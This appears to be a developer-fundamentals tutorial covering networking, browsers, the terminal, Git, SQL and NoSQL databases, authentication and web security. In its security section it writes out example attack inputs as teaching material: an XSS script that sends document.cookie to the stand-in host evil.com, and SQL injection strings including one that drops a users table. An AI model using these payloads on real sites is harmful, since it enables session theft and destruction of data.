    content: `
## Introduction

![gallery:/dev-fundamentals/Hero%20Image/image.png|Hero Image]
![gallery:/dev-fundamentals/Hero%20Image/image%20copy.png|Hero Image 2]
![gallery:/dev-fundamentals/Hero%20Image/image%20copy%202.png|Hero Image 3]
![gallery:/dev-fundamentals/Hero%20Image/image%20copy%203.png|Hero Image 4]
![gallery:/dev-fundamentals/Hero%20Image/image%20copy%204.png|Hero Image 5]
![gallery:/dev-fundamentals/Hero%20Image/image%20copy%205.png|Hero Image 6]

Every developer learns frameworks. Not every developer understands what happens underneath.

You can build a Next.js app without knowing how HTTP works. You can use Git without understanding what a commit actually is. You can implement JWT auth without knowing why it is secure. But the moment something breaks in production — and it will — you will be completely lost without these fundamentals.

This guide covers the eight concepts that separate developers who just write code from developers who actually understand what their code is doing.

---

## 1. How the Internet Works

![gallery:/dev-fundamentals/Section:%20Internet_Networking/image.png|Internet & Networking]
![gallery:/dev-fundamentals/Section:%20Internet_Networking/image%20copy.png|Internet & Networking 2]
![gallery:/dev-fundamentals/Section:%20Internet_Networking/image%20copy%202.png|Internet & Networking 3]
![gallery:/dev-fundamentals/Section:%20Internet_Networking/image%20copy%203.png|Internet & Networking 4]
![gallery:/dev-fundamentals/Section:%20Internet_Networking/image%20copy%204.png|Internet & Networking 5]
![gallery:/dev-fundamentals/Section:%20Internet_Networking/image%20copy%205.png|Internet & Networking 6]

Every time you open a browser and type a URL, a remarkable chain of events happens in milliseconds. Understanding this chain is non-negotiable for any developer.

### The Big Picture

\`\`\`
You type: https://google.com
         ↓
1. DNS Lookup      — translate domain to IP address
2. TCP Handshake   — establish connection
3. TLS Handshake   — secure the connection (HTTPS)
4. HTTP Request    — browser asks for the page
5. Server Response — server sends back HTML/CSS/JS
6. Browser Render  — browser displays the page
\`\`\`

### DNS — The Internet's Phone Book

DNS (Domain Name System) translates human-readable domain names into IP addresses that computers use to communicate.

When you type \`google.com\`:
1. Browser checks its own DNS cache
2. OS checks its local cache
3. Query goes to your ISP's DNS resolver
4. Resolver asks the root nameserver
5. Root nameserver points to the .com nameserver
6. .com nameserver points to Google's nameserver
7. Google's nameserver returns the IP: \`142.250.80.46\`

This entire process takes under 50ms. The result is cached so it does not repeat on every request.

### TCP — Reliable Delivery

TCP (Transmission Control Protocol) ensures data arrives completely and in order. Before any data is sent, TCP performs a **three-way handshake**:

\`\`\`
Client → Server: SYN       (I want to connect)
Server → Client: SYN-ACK   (OK, I'm ready)
Client → Server: ACK       (Great, let's go)
\`\`\`

After this handshake, the connection is established and data can flow reliably in both directions.

### HTTP vs HTTPS

HTTP (HyperText Transfer Protocol) is the language browsers and servers use to communicate.

**HTTP Request:**
\`\`\`http
GET /api/users HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGci...
Content-Type: application/json
\`\`\`

**HTTP Response:**
\`\`\`http
HTTP/1.1 200 OK
Content-Type: application/json

{ "users": [...] }
\`\`\`

HTTPS adds TLS (Transport Layer Security) on top of HTTP. TLS encrypts all data between client and server so no one in the middle can read it. This is why you see the padlock icon in your browser.

**HTTP Status Codes you must know:**

| Code | Meaning |
|---|---|
| 200 | OK — success |
| 201 | Created — resource created |
| 301 | Moved Permanently — redirect |
| 400 | Bad Request — client sent invalid data |
| 401 | Unauthorized — not authenticated |
| 403 | Forbidden — authenticated but not allowed |
| 404 | Not Found — resource does not exist |
| 429 | Too Many Requests — rate limited |
| 500 | Internal Server Error — server crashed |

### IP Addresses and Ports

Every device on the internet has an IP address. A port identifies a specific service on that device.

\`\`\`
Common ports:
80   → HTTP
443  → HTTPS
5432 → PostgreSQL
3306 → MySQL
6379 → Redis
3000 → Node.js dev server (convention)
\`\`\`

When you run \`pnpm dev\` and see \`localhost:3000\`, you are connecting to IP \`127.0.0.1\` (your own machine) on port \`3000\`.

---

## 2. How Browsers Work

![gallery:/dev-fundamentals/Section:%20Software%20Engineering%20Core%20Concepts/image.png|Browser Concepts]
![gallery:/dev-fundamentals/Section:%20Software%20Engineering%20Core%20Concepts/image%20copy.png|Browser Concepts 2]
![gallery:/dev-fundamentals/Section:%20Software%20Engineering%20Core%20Concepts/image%20copy%202.png|Browser Concepts 3]
![gallery:/dev-fundamentals/Section:%20Software%20Engineering%20Core%20Concepts/image%20copy%203.png|Browser Concepts 4]
![gallery:/dev-fundamentals/Section:%20Software%20Engineering%20Core%20Concepts/image%20copy%204.png|Browser Concepts 5]
![gallery:/dev-fundamentals/Section:%20Software%20Engineering%20Core%20Concepts/image%20copy%205.png|Browser Concepts 6]
![gallery:/dev-fundamentals/Section:%20Software%20Engineering%20Core%20Concepts/image%20copy%206.png|Browser Concepts 7]

The browser is the most complex piece of software most developers interact with daily. Understanding how it works makes you a dramatically better frontend developer.

### The Rendering Pipeline

When a browser receives HTML from a server, it goes through a precise sequence:

\`\`\`
HTML bytes received
       ↓
1. Parse HTML   → build DOM tree
2. Parse CSS    → build CSSOM tree
3. Combine      → Render Tree (only visible elements)
4. Layout       → calculate position and size of each element
5. Paint        → fill in pixels (colors, borders, text)
6. Composite    → layer everything together on screen
\`\`\`

### The DOM

The DOM (Document Object Model) is the browser's in-memory representation of your HTML as a tree of objects. JavaScript can read and modify this tree in real time — that is how React, Vue, and every other frontend framework works.

### The JavaScript Event Loop

JavaScript is **single-threaded** — it can only do one thing at a time. But it handles async operations without blocking. The Event Loop constantly checks: is the Call Stack empty? If yes, take the next callback from the Event Queue and push it onto the Call Stack.

\`\`\`javascript
console.log("1");        // sync → runs immediately

setTimeout(() => {
  console.log("2");      // async → goes through Event Queue
}, 0);

console.log("3");        // sync → runs immediately

// Output: 1, 3, 2
// Even with 0ms delay, setTimeout is async
\`\`\`

### Critical Rendering Path

\`\`\`html
<!-- Blocks rendering — browser waits before showing anything -->
<head>
  <script src="heavy-script.js"></script>
</head>

<!-- Non-blocking — downloads in parallel, executes after HTML parsed -->
<head>
  <script src="heavy-script.js" defer></script>
</head>
\`\`\`

### localStorage vs sessionStorage vs Cookies

| Storage | Capacity | Expires | Sent to Server | JS Access |
|---|---|---|---|---|
| localStorage | ~5MB | Never | No | Yes |
| sessionStorage | ~5MB | Tab close | No | Yes |
| Cookie | ~4KB | Configurable | Yes (every request) | Yes (unless HttpOnly) |

**Rule:** Use cookies for auth tokens (with \`HttpOnly\` and \`Secure\` flags). Never store sensitive data in localStorage — any JavaScript on the page can read it.

---

## 3. OS & Terminal Basics

Every developer works on an operating system. Most production servers run Linux. If you cannot navigate the terminal, you are dependent on GUIs that will not exist in production environments.

### The File System

\`\`\`
/                    <- root (top of everything)
├── home/
│   └── tushar/      <- your home directory (~)
│       ├── projects/
│       └── .bashrc
├── etc/             <- system config files
├── var/
│   └── log/         <- system logs
└── usr/
    └── bin/         <- installed programs
\`\`\`

### Essential Commands

\`\`\`bash
# Navigation
pwd                  # print working directory
ls -la               # list all files (including hidden)
cd projects          # change directory
cd ..                # go up one level
cd ~                 # go to home directory

# Files & Directories
mkdir my-project     # create directory
touch index.js       # create empty file
cp file.txt copy.txt # copy file
mv file.txt new.txt  # move or rename file
rm file.txt          # delete file
rm -rf folder/       # delete folder recursively (careful!)

# Reading Files
cat file.txt         # print entire file
head -n 20 file.txt  # first 20 lines
tail -f app.log      # follow log file in real time
grep "error" app.log # search for pattern in file

# Processes
ps aux               # list all running processes
kill -9 <PID>        # force kill a process
lsof -i :3000        # what is using port 3000?

# Network
curl https://api.example.com/users   # HTTP GET request
ping google.com                      # check connectivity
\`\`\`

### File Permissions

\`\`\`
-rwxr-xr-x  tushar  script.sh
 │││││││││
 │││││││└└─ other:  r-x (read + execute)
 │││││└└─── group:  r-x (read + execute)
 │││└────── owner:  rwx (read + write + execute)
 └───────── file type: - (regular file)

r = read (4), w = write (2), x = execute (1)
chmod 755 = rwxr-xr-x
\`\`\`

### Environment Variables

\`\`\`bash
# Set temporarily (current session only)
export DATABASE_URL="postgresql://localhost/mydb"

# Read a variable
echo $DATABASE_URL

# Set permanently
echo 'export MY_VAR="value"' >> ~/.bashrc
source ~/.bashrc
\`\`\`

This is exactly how \`.env.local\` works in Next.js — it injects environment variables into the Node.js process at startup.

### SSH — Connecting to Remote Servers

\`\`\`bash
# Connect to a server
ssh username@192.168.1.100
ssh -i ~/.ssh/my-key.pem ubuntu@ec2-ip.amazonaws.com

# Copy files to/from server
scp file.txt username@server:/home/username/
\`\`\`

---

## 4. Git & Version Control

![gallery:/dev-fundamentals/Section:%20Git%20%26%20Version%20Control/image.png|Git & Version Control]
![gallery:/dev-fundamentals/Section:%20Git%20%26%20Version%20Control/image%20copy.png|Git & Version Control 2]
![gallery:/dev-fundamentals/Section:%20Git%20%26%20Version%20Control/image%20copy%202.png|Git & Version Control 3]
![gallery:/dev-fundamentals/Section:%20Git%20%26%20Version%20Control/image%20copy%203.png|Git & Version Control 4]
![gallery:/dev-fundamentals/Section:%20Git%20%26%20Version%20Control/image%20copy%204.png|Git & Version Control 5]
![gallery:/dev-fundamentals/Section:%20Git%20%26%20Version%20Control/image%20copy%205.png|Git & Version Control 6]

Git is not just a backup tool. It is a time machine, a collaboration system, and a safety net. Every professional developer must understand it deeply.

### How Git Actually Works

Git stores your project as a series of **snapshots**, not diffs. Each commit is a complete snapshot of every file at that point in time, with a pointer to the previous commit.

\`\`\`
Commit C  <-  Commit B  <-  Commit A  <-  (initial)
  |
  Each has: tree (files), author, message, timestamp
\`\`\`

### The Three Areas

\`\`\`
Working Directory   ->   Staging Area   ->   Repository
  (your files)           (git add)            (git commit)
\`\`\`

- **Working Directory:** Files you are editing right now
- **Staging Area:** Files marked to include in the next commit
- **Repository:** The permanent history of all commits

### Essential Git Commands

\`\`\`bash
# Setup
git config --global user.name "Tushar Barua"
git config --global user.email "tushar@example.com"

# Start
git init                      # initialize new repo
git clone <url>               # clone existing repo

# Daily workflow
git status                    # what changed?
git add .                     # stage all changes
git commit -m "feat: add login page"
git push origin main          # push to remote
git pull origin main          # pull latest changes

# Branching
git checkout -b feature/auth  # create + switch branch
git merge feature/auth        # merge into current branch
git branch -d feature/auth    # delete branch

# Inspection
git log --oneline             # compact commit history
git diff                      # what changed (unstaged)
git show <commit-hash>        # show specific commit

# Undoing
git restore file.txt          # discard working dir changes
git revert <hash>             # undo commit (safe, keeps history)
git reset --hard HEAD~1       # undo last commit (destructive!)
\`\`\`

### Branching Strategy

\`\`\`
main          <- production-ready code only
  └─ develop  <- integration branch
       ├─ feature/login
       ├─ feature/dashboard
       └─ fix/navbar-bug
\`\`\`

**Rule:** Never commit directly to \`main\`. Always work on a feature branch, open a Pull Request, get it reviewed, then merge.

### Writing Good Commit Messages

\`\`\`bash
# Bad
git commit -m "fix"
git commit -m "changes"

# Good — Conventional Commits format
git commit -m "feat: add user authentication with JWT"
git commit -m "fix: resolve null pointer in login handler"
git commit -m "refactor: extract email validation to utility"
git commit -m "docs: update API documentation"
git commit -m "chore: upgrade dependencies to latest"
\`\`\`

Format: \`type(scope): description\`
- \`feat\` — new feature
- \`fix\` — bug fix
- \`refactor\` — code change that is not a fix or feature
- \`docs\` — documentation only
- \`chore\` — build process, dependencies

### .gitignore

\`\`\`gitignore
# Dependencies
node_modules/

# Environment variables — NEVER commit these
.env
.env.local
.env.production

# Build output
.next/
dist/
build/

# OS files
.DS_Store
\`\`\`

**Critical rule:** Never commit \`.env\` files. Once a secret is in Git history, it is compromised — even if you delete it later, it remains in the history.

---

## 5. Databases — SQL vs NoSQL

![gallery:/dev-fundamentals/Section:%20Database%20Fundamentals/image.png|Database Fundamentals]
![gallery:/dev-fundamentals/Section:%20Database%20Fundamentals/image%20copy.png|Database Fundamentals 2]
![gallery:/dev-fundamentals/Section:%20Database%20Fundamentals/image%20copy%202.png|Database Fundamentals 3]
![gallery:/dev-fundamentals/Section:%20Database%20Fundamentals/image%20copy%203.png|Database Fundamentals 4]
![gallery:/dev-fundamentals/Section:%20Database%20Fundamentals/image%20copy%204.png|Database Fundamentals 5]

Every application needs to store data. Choosing the wrong database type is an architectural mistake that is expensive to fix later.

### Relational Databases (SQL)

SQL databases store data in tables with rows and columns. Relationships between tables are defined by foreign keys. The schema is strict — you define the structure before inserting data.

\`\`\`sql
-- Create tables
CREATE TABLE users (
  id        SERIAL PRIMARY KEY,
  email     VARCHAR(255) UNIQUE NOT NULL,
  name      VARCHAR(100) NOT NULL,
  created_at TIMESTAMP DEFAULT NOW()
);

CREATE TABLE posts (
  id        SERIAL PRIMARY KEY,
  title     VARCHAR(255) NOT NULL,
  content   TEXT,
  author_id INT REFERENCES users(id),
  created_at TIMESTAMP DEFAULT NOW()
);

-- Query with JOIN
SELECT posts.title, users.name
FROM posts
JOIN users ON posts.author_id = users.id
WHERE posts.created_at > NOW() - INTERVAL '7 days'
ORDER BY posts.created_at DESC;
\`\`\`

**Core SQL operations:**

\`\`\`sql
-- INSERT
INSERT INTO users (email, name) VALUES ('tushar@example.com', 'Tushar');

-- SELECT with filter
SELECT * FROM users WHERE email = 'tushar@example.com';

-- UPDATE
UPDATE users SET name = 'Tushar Barua' WHERE id = 1;

-- DELETE
DELETE FROM users WHERE id = 1;

-- Aggregate
SELECT COUNT(*), AVG(age) FROM users WHERE active = true;
\`\`\`

**Popular SQL databases:** PostgreSQL (best for production), MySQL, SQLite (development/embedded)

### NoSQL Databases

NoSQL databases store data in flexible formats — documents, key-value pairs, graphs, or wide columns. No fixed schema required.

**Document databases (MongoDB):**
\`\`\`javascript
// Documents look like JSON objects
{
  _id: ObjectId("..."),
  email: "tushar@example.com",
  name: "Tushar",
  posts: [
    { title: "First Post", tags: ["js", "react"] },
    { title: "Second Post", tags: ["node"] }
  ]
}

// Query
db.users.findOne({ email: "tushar@example.com" });
db.users.find({ "posts.tags": "react" });
\`\`\`

**Key-Value stores (Redis):**
\`\`\`javascript
// Store and retrieve values
await redis.set("user:123", JSON.stringify(user), "EX", 3600); // expires in 1hr
const user = JSON.parse(await redis.get("user:123"));

// Use cases: caching, sessions, rate limiting, pub/sub
\`\`\`

### SQL vs NoSQL — When to Use What

| Factor | SQL (PostgreSQL) | NoSQL (MongoDB) |
|---|---|---|
| Data structure | Structured, consistent | Flexible, varying |
| Relationships | Complex joins, foreign keys | Embedded documents |
| Schema | Fixed, enforced | Dynamic, flexible |
| Scaling | Vertical (mostly) | Horizontal (easier) |
| Transactions | Full ACID support | Limited (improving) |
| Best for | Financial, e-commerce, ERP | Content, catalogs, real-time |

**Rule of thumb:**
- Use **PostgreSQL** by default. It handles 99% of use cases, has full ACID transactions, and scales well.
- Use **MongoDB** when your data is genuinely document-shaped and schema varies significantly between records.
- Use **Redis** for caching, sessions, and anything that needs sub-millisecond reads.

### Indexes — The Most Important Performance Tool

\`\`\`sql
-- Without index: full table scan O(n)
SELECT * FROM users WHERE email = 'tushar@example.com';

-- Create index
CREATE INDEX idx_users_email ON users(email);

-- Now the same query uses the index: O(log n)
-- Always index columns you filter or sort by frequently
\`\`\`

### Transactions

A transaction groups multiple operations so they either all succeed or all fail. Critical for financial operations.

\`\`\`sql
BEGIN;
  UPDATE accounts SET balance = balance - 500 WHERE id = 1;
  UPDATE accounts SET balance = balance + 500 WHERE id = 2;
COMMIT;
-- If anything fails, ROLLBACK automatically undoes both
\`\`\`

---

## 6. Authentication & Authorization

![gallery:/dev-fundamentals/Section:%20Authentication%20%26%20Authorization/image.png|Authentication & Authorization]
![gallery:/dev-fundamentals/Section:%20Authentication%20%26%20Authorization/image%20copy.png|Authentication & Authorization 2]
![gallery:/dev-fundamentals/Section:%20Authentication%20%26%20Authorization/image%20copy%202.png|Authentication & Authorization 3]
![gallery:/dev-fundamentals/Section:%20Authentication%20%26%20Authorization/image%20copy%203.png|Authentication & Authorization 4]
![gallery:/dev-fundamentals/Section:%20Authentication%20%26%20Authorization/image%20copy%204.png|Authentication & Authorization 5]
![gallery:/dev-fundamentals/Section:%20Authentication%20%26%20Authorization/image%20copy%205.png|Authentication & Authorization 6]

Authentication answers: **who are you?**
Authorization answers: **what are you allowed to do?**

These are two different concepts that developers often confuse.

### Sessions vs JWT

**Session-based auth (stateful):**
\`\`\`
1. User logs in with email + password
2. Server verifies credentials
3. Server creates a session in the database
4. Server sends a session ID in a cookie
5. On every request, browser sends the cookie
6. Server looks up the session ID in the database
7. If found and valid, request is authorized
\`\`\`

**JWT-based auth (stateless):**
\`\`\`
1. User logs in with email + password
2. Server verifies credentials
3. Server creates a signed JWT token containing user data
4. Server sends the JWT to the client
5. Client stores it (cookie or memory)
6. On every request, client sends the JWT
7. Server verifies the signature — no database lookup needed
\`\`\`

### JWT Deep Dive

A JWT has three parts separated by dots:

\`\`\`
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJ1c2VyIn0.abc123
      HEADER                        PAYLOAD                  SIGNATURE
\`\`\`

- **Header:** algorithm used (HS256, RS256)
- **Payload:** the data (userId, role, expiry) — NOT encrypted, just base64 encoded
- **Signature:** HMAC of header + payload using your secret key

\`\`\`javascript
// Creating a JWT
const token = jwt.sign(
  { userId: 1, role: "admin" },   // payload
  process.env.JWT_SECRET,          // secret
  { expiresIn: "7d" }              // options
);

// Verifying a JWT
try {
  const decoded = jwt.verify(token, process.env.JWT_SECRET);
  console.log(decoded.userId); // 1
} catch (err) {
  // Token is invalid or expired
}
\`\`\`

**Critical:** The payload is only base64 encoded, not encrypted. Anyone can decode it. Never put sensitive data (passwords, credit cards) in a JWT payload.

### Password Hashing

Never store plain text passwords. Always hash with bcrypt:

\`\`\`javascript
import bcrypt from "bcryptjs";

// Hash password before saving to database
const hash = await bcrypt.hash(plainPassword, 12); // 12 = cost factor
await db.user.create({ email, password: hash });

// Verify password on login
const isValid = await bcrypt.compare(plainPassword, hash);
if (!isValid) throw new Error("Invalid credentials");
\`\`\`

Bcrypt is slow by design — that is the point. It makes brute-force attacks computationally expensive.

### OAuth 2.0 — Login with Google/GitHub

OAuth lets users authenticate using a third-party provider without sharing their password with your app.

\`\`\`
1. User clicks "Login with Google"
2. Your app redirects to Google's auth page
3. User approves access
4. Google redirects back with an authorization code
5. Your server exchanges the code for an access token
6. Your server uses the token to get user info from Google
7. Your server creates/finds the user in your database
8. Your server issues your own JWT/session
\`\`\`

### Role-Based Access Control (RBAC)

\`\`\`javascript
// Middleware to check role
function requireRole(role) {
  return (req, res, next) => {
    if (req.user.role !== role) {
      return res.status(403).json({ error: "Forbidden" });
    }
    next();
  };
}

// Usage
router.delete("/users/:id", authenticate, requireRole("admin"), deleteUser);
\`\`\`

### Secure Cookie Settings

\`\`\`javascript
res.cookie("token", jwt, {
  httpOnly: true,   // JS cannot access it (prevents XSS)
  secure: true,     // only sent over HTTPS
  sameSite: "lax",  // prevents CSRF attacks
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
});
\`\`\`

---

## 7. Security Fundamentals

![gallery:/dev-fundamentals/Section:%20Security%20Fundamentals/image.png|Security Fundamentals]
![gallery:/dev-fundamentals/Section:%20Security%20Fundamentals/image%20copy.png|Security Fundamentals 2]
![gallery:/dev-fundamentals/Section:%20Security%20Fundamentals/image%20copy%202.png|Security Fundamentals 3]
![gallery:/dev-fundamentals/Section:%20Security%20Fundamentals/image%20copy%203.png|Security Fundamentals 4]
![gallery:/dev-fundamentals/Section:%20Security%20Fundamentals/image%20copy%204.png|Security Fundamentals 5]
![gallery:/dev-fundamentals/Section:%20Security%20Fundamentals/image%20copy%205.png|Security Fundamentals 6]
![gallery:/dev-fundamentals/Section:%20Security%20Fundamentals/image%20copy%206.png|Security Fundamentals 7]
![gallery:/dev-fundamentals/Section:%20Security%20Fundamentals/image%20copy%207.png|Security Fundamentals 8]

Security is not a feature you add at the end. It is a mindset you apply from the first line of code. These are the four attacks every developer must understand and prevent.

### XSS — Cross-Site Scripting

XSS happens when an attacker injects malicious JavaScript into your page that runs in other users' browsers.

\`\`\`javascript
// Attacker submits this as their username:
// <script>fetch('https://evil.com/steal?c='+document.cookie)</script>

// If you render it without escaping:
// <p>Welcome, {username}</p>  — the script executes for every visitor
\`\`\`

**Prevention:**
\`\`\`javascript
// React escapes output automatically — never use dangerouslySetInnerHTML with user data

// Set Content Security Policy header
"Content-Security-Policy": "default-src 'self'"

// Use HttpOnly cookies — JS cannot read them even if XSS occurs
res.cookie("token", jwt, { httpOnly: true });
\`\`\`

### CSRF — Cross-Site Request Forgery

CSRF tricks a logged-in user's browser into making an unwanted request to your server.

\`\`\`
1. User is logged into bank.com (has valid session cookie)
2. User visits evil.com
3. evil.com has a hidden form that auto-submits to bank.com/transfer
4. Browser sends the bank.com cookie automatically
5. Bank processes the transfer as if the user did it
\`\`\`

**Prevention:**
\`\`\`javascript
// SameSite cookies — browser won't send on cross-site requests
res.cookie("session", id, { sameSite: "lax" });
\`\`\`

### SQL Injection

SQL injection happens when user input is directly concatenated into a SQL query.

\`\`\`javascript
// VULNERABLE — never do this
const query = \`SELECT * FROM users WHERE email = '\${req.body.email}'\`;
// Attacker sends: ' OR '1'='1  — returns ALL users
// Worse: '; DROP TABLE users; --

// SAFE — always use parameterized queries
const result = await db.query(
  "SELECT * FROM users WHERE email = $1",
  [req.body.email] // passed separately, never concatenated
);
\`\`\`

### Security Headers

\`\`\`javascript
// next.config.ts — add to every response
const securityHeaders = [
  { key: "X-Frame-Options",           value: "DENY" },
  { key: "X-Content-Type-Options",    value: "nosniff" },
  { key: "Referrer-Policy",           value: "strict-origin-when-cross-origin" },
  { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains" },
];
\`\`\`

### Rate Limiting

Without rate limiting, attackers can brute-force passwords or exhaust your server resources.

\`\`\`javascript
// 10 requests per minute per IP
if (!rateLimit(\`chat:\${ip}\`, 10, 60_000)) {
  return res.status(429).json({ error: "Too many requests" });
}

// Stricter for auth — 5 attempts per hour
if (!rateLimit(\`login:\${ip}\`, 5, 60 * 60_000)) {
  return res.status(429).json({ error: "Too many login attempts" });
}
\`\`\`

---

## 8. Networking Basics

![gallery:/dev-fundamentals/APIs%20%26%20Backend%20Fundamentals/image.png|APIs & Backend]
![gallery:/dev-fundamentals/APIs%20%26%20Backend%20Fundamentals/image%20copy.png|APIs & Backend 2]
![gallery:/dev-fundamentals/APIs%20%26%20Backend%20Fundamentals/image%20copy%202.png|APIs & Backend 3]
![gallery:/dev-fundamentals/APIs%20%26%20Backend%20Fundamentals/image%20copy%203.png|APIs & Backend 4]
![gallery:/dev-fundamentals/APIs%20%26%20Backend%20Fundamentals/image%20copy%204.png|APIs & Backend 5]
![gallery:/dev-fundamentals/APIs%20%26%20Backend%20Fundamentals/image%20copy%205.png|APIs & Backend 6]
![gallery:/dev-fundamentals/APIs%20%26%20Backend%20Fundamentals/image%20copy%206.png|APIs & Backend 7]
![gallery:/dev-fundamentals/System%20Design/image.png|System Design]
![gallery:/dev-fundamentals/System%20Design/image%20copy.png|System Design 2]
![gallery:/dev-fundamentals/System%20Design/image%20copy%202.png|System Design 3]
![gallery:/dev-fundamentals/System%20Design/image%20copy%203.png|System Design 4]
![gallery:/dev-fundamentals/System%20Design/image%20copy%204.png|System Design 5]
![gallery:/dev-fundamentals/System%20Design/image%20copy%205.png|System Design 6]

Understanding networking makes you a better developer and a better debugger. When something breaks in production, networking knowledge tells you where to look.

### TCP vs UDP

| | TCP | UDP |
|---|---|---|
| Reliability | Guaranteed delivery | Best effort |
| Order | In order | May arrive out of order |
| Speed | Slower (handshake + ACK) | Faster (no overhead) |
| Use cases | HTTP, databases, email | Video streaming, gaming, DNS |

### WebSockets

HTTP is request-response — the client always initiates. WebSockets provide a persistent, bidirectional connection.

\`\`\`javascript
// Server
const wss = new WebSocketServer({ port: 8080 });
wss.on("connection", (ws) => {
  ws.on("message", (data) => {
    wss.clients.forEach((client) => client.send(data)); // broadcast
  });
});

// Client
const ws = new WebSocket("wss://api.example.com");
ws.onmessage = (event) => console.log(event.data);
ws.send(JSON.stringify({ type: "message", text: "Hello" }));
\`\`\`

Use WebSockets for: real-time chat, live notifications, collaborative editing, live dashboards.

### CDN — Content Delivery Network

A CDN is a network of servers distributed globally. Static files are served from the nearest node instead of your origin server.

\`\`\`
User in Bangladesh  →  CDN node in Singapore  →  fast response
User in Germany     →  CDN node in Frankfurt  →  fast response

Without CDN:
User in Bangladesh  →  Origin server in US    →  slow response
\`\`\`

Next.js on Vercel automatically puts your static assets on a CDN.

### DNS Record Types

\`\`\`
A record     — domain → IPv4 address
               tushar.dev → 76.76.21.21

CNAME record — domain → another domain
               www.tushar.dev → tushar.dev

MX record    — mail server for the domain

TXT record   — arbitrary text (domain verification, SPF)
\`\`\`

